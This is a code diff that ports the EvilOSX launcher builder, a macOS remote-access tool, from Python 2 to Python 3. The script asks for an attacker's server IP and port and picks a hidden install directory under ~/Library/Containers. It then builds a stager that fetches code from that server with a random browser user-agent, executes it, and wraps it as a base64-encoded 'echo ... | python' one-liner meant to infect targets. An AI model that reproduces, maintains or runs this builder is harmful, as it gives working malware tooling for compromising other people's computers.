@@ -1,4 +1,4 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """Builds launchers which are used to infect the target system."""
 __author__ = "Marten4n6"
@@ -7,13 +7,13 @@ __license__ = "GPLv3"
 from sys import exit
 import os
 import fnmatch
-import imp
+import importlib.util
 import random
 import string
 import base64
 import json
 from textwrap import dedent
-from server.loader_factory import LoaderFactory
+from server.model import LoaderFactory
 
 MESSAGE_INPUT = "\033[1m" + "[?] " + "\033[0m"
 MESSAGE_INFO = "\033[94m" + "[I] " + "\033[0m"
@@ -23,11 +23,8 @@ MESSAGE_ATTENTION = "\033[91m" + "[!] " + "\033[0m"
 class Utils:
     """Static utility class."""
 
-    def __init__(self):
-        pass
-
     @staticmethod
-    def random_string(size=None, numbers=False):
+    def random_string(size: int=None, numbers: bool=False) -> str:
         """:return A randomly generated string of x characters.
 
         If no size is specified, a random number between 6 and 15 will be used.
@@ -44,7 +41,7 @@ class Utils:
         return name
 
     @staticmethod
-    def get_random_user_agent():
+    def get_random_user_agent() -> str:
         """:return A random user-agent string."""
         user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36",
@@ -64,9 +61,17 @@ class LauncherFactory:
 
     def __init__(self):
         self._launchers = {
-            "helpers": imp.load_source("helpers", os.path.join(os.path.dirname(__file__), "launchers", "helpers.py"))
+            "helpers": self._load_module("helpers", os.path.join("launchers", "helpers.py"))
         }
         self._load_launchers()
+
+    @staticmethod
+    def _load_module(module_name: str, module_path: str):
+        """Loads a module."""
+        spec = importlib.util.spec_from_file_location(module_name, module_path)
+        module = importlib.util.module_from_spec(spec)
+        spec.loader.exec_module(module)
+        return module
 
     def _load_launchers(self):
         """Loads all launchers."""
@@ -78,27 +83,22 @@ class LauncherFactory:
                 if launcher_name in ["__init__", "template", "helpers"]:
                     continue
 
-                self._launchers[launcher_name] = imp.load_source(launcher_name, launcher_path).Launcher()
+                self._launchers[launcher_name] = self._load_module(launcher_name, launcher_path).Launcher()
 
-    def get_launchers(self):
-        """:return A list of all launchers."""
+    def get_launchers(self) -> dict:
+        """:return A dict of all launchers."""
         launchers = dict(self._launchers)
 
         launchers.pop("helpers")
         return launchers
 
-    def get_launcher(self, index):
-        """:return A tuple containg the launcher's name and class."""
-        for i, (key, launcher) in enumerate(self.get_launchers().iteritems()):
+    def get_launcher(self, index: int):
+        """:return A tuple containing the launcher's name and class."""
+        for i, (key, launcher) in enumerate(self.get_launchers().items()):
             if i == index:
                 return key, launcher
 
-    def create_launcher(self, launcher_name, stager):
-        """
-        :param launcher_name: The name of the launcher to create.
-        :param stager: The stager which the launcher should run.
-        :return: The location to the created launcher.
-        """
+    def create_launcher(self, launcher_name: str, stager: str) -> str:
         output_extension, launcher_code = self._launchers[launcher_name].generate(stager)
 
         output_directory = os.path.dirname(os.path.realpath(__file__)) + "/builds/"
@@ -106,7 +106,7 @@ class LauncherFactory:
         output_file = os.path.join(output_directory, output_name)
 
         if not output_extension:
-            print dedent(launcher_code)
+            print(dedent(launcher_code))
         else:
             if not os.path.exists(output_directory):
                 os.mkdir(output_directory)
@@ -153,45 +153,41 @@ def create_stager(server_host, server_port, program_directory, loader_name, load
 
     request = urllib2.Request(url="https://%s:%s/api/stager", headers={"User-Agent": "%s"}, data=data)    
     response = urllib2.urlopen(request, context=req_context)
-
-    exec("".join(response.readlines()))
+    
+    exec(response.read().decode())
     """ % (
         Utils.random_string(), Utils.random_string(numbers=True),
-        base64.b64encode(json.dumps(options)), server_host, server_port, Utils.get_random_user_agent()
+        base64.b64encode(json.dumps(options).encode()).decode(), server_host,
+        server_port, Utils.get_random_user_agent()
     )
 
-    return "echo \"import base64;exec(base64.b64decode('%s'))\" | python" % base64.b64encode(dedent(stager_code))
+    return "echo \"import base64;exec(base64.b64decode('{}'))\" | python".format(
+        base64.b64encode(dedent(stager_code).encode()).decode()
+    )
 
 
 def main():
-    server_host = raw_input(MESSAGE_INPUT + "Server IP (where EvilOSX will connect to): ")
-    while True:
-        try:
-            server_port = int(raw_input(MESSAGE_INPUT + "Server port: "))
-            break
-        except ValueError:
-            print MESSAGE_ATTENTION + "Invalid server port."
-    program_directory = raw_input(
-        MESSAGE_INPUT + "Where should EvilOSX live? [ENTER for ~/Library/Containers/.<RANDOM>]: "
-    )
+    server_host = input(MESSAGE_INPUT + "Server IP (where EvilOSX will connect to): ")
+    server_port = int(input(MESSAGE_INPUT + "Server port: "))
+    program_directory = input(MESSAGE_INPUT + "Where should EvilOSX live? [ENTER for ~/Library/Containers/.<RANDOM>]: ")
 
     if not program_directory:
-        random_directory = "~/Library/Containers/.%s" % Utils.random_string()
+        random_directory = "~/Library/Containers/.{}".format(Utils.random_string())
 
         program_directory = random_directory
-        print MESSAGE_INFO + "Using: %s" % random_directory
+        print(MESSAGE_INFO + "Using: {}".format(random_directory))
 
     launcher_factory = LauncherFactory()
     loader_factory = LoaderFactory()
 
     # Prompt the user to select a launcher
-    print MESSAGE_INFO + "%s available launchers: " % len(launcher_factory.get_launchers())
-    for i, (key, launcher) in enumerate(launcher_factory.get_launchers().iteritems()):
-        print "%s = %s -> %s" % (str(i), key, launcher.info["Description"])
+    print(MESSAGE_INFO + "{} available launchers: ".format(len(launcher_factory.get_launchers())))
+    for i, (key, launcher) in enumerate(launcher_factory.get_launchers().items()):
+        print("{} = {} -> {}".format(str(i), key, launcher.get_info()["Description"]))
 
     while True:
         try:
-            launcher_index = raw_input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")
+            launcher_index = input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")
 
             if not launcher_index:
                 launcher_name, launcher = launcher_factory.get_launcher(0)
@@ -200,16 +196,16 @@ def main():
 
             break
         except ValueError:
-            print MESSAGE_ATTENTION + "Invalid launcher."
+            print(MESSAGE_ATTENTION + "Invalid launcher.")
 
     # Prompt the user to select a loader
-    print MESSAGE_INFO + "%s available loaders: " % len(loader_factory.get_loaders())
-    for i, (key, loader) in enumerate(loader_factory.get_loaders().iteritems()):
-        print "%s = %s -> %s" % (str(i), key, loader.info["Description"])
+    print(MESSAGE_INFO + "%s available loaders: " % len(loader_factory.get_loaders()))
+    for i, (key, loader) in enumerate(loader_factory.get_loaders().items()):
+        print("{} = {} -> {}".format(str(i), key, loader.get_info()["Description"]))
 
     while True:
         try:
-            loader_index = raw_input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")
+            loader_index = input(MESSAGE_INPUT + "Launcher to use [ENTER for 0]: ")
 
             if not loader_index:
                 loader_name, loader = loader_factory.get_loader(0)
@@ -218,22 +214,22 @@ def main():
 
             break
         except ValueError:
-            print MESSAGE_ATTENTION + "Invalid loader."
+            print(MESSAGE_ATTENTION + "Invalid loader.")
 
     # Create the launcher
     loader_options = loader.setup()
     stager = create_stager(server_host, server_port, program_directory, loader_name, loader_options)
 
-    print MESSAGE_INFO + "Creating \"%s\" launcher..." % launcher_name
+    print(MESSAGE_INFO + "Creating \"{}\" launcher...".format(launcher_name))
     launcher_path = launcher_factory.create_launcher(launcher_name, stager)
 
     if launcher_path:
-        print MESSAGE_INFO + "Launcher written to: %s" % launcher_path
+        print(MESSAGE_INFO + "Launcher written to: {}".format(launcher_path))
 
 
 if __name__ == '__main__':
     try:
         main()
     except KeyboardInterrupt:
-        print "\n" + MESSAGE_INFO + "Interrupted."
+        print("\n" + MESSAGE_INFO + "Interrupted.")
         exit(0)
